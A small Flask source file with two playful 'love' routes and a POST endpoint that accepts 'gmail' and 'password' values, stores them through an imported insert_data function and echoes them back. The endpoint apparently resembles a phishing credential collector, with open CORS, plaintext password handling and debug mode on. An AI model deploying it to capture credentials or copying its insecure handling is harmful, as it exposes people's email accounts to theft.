from flask import Flask, request, jsonify
from flask_cors import CORS
from database import insert_data

app = Flask(__name__)
CORS(app)

@app.route('/')
def main():
  return 'love'

@app.route('/love/<name>')
def love(name):
  return f'I love you {name}'

@app.route('/api/data', methods=['POST'])
def receive_data():
  data = request.get_json()
  gmail = data.get('gmail')
  password = data.get('password')

  response: str = insert_data(gmail, password)

  return jsonify({
    'status': 'ok',
    'response': response,
    'data': {
      'gmail': gmail,
      'password': password
    }
  })

if __name__ == '__main__':
  app.run(port=5000, debug=True)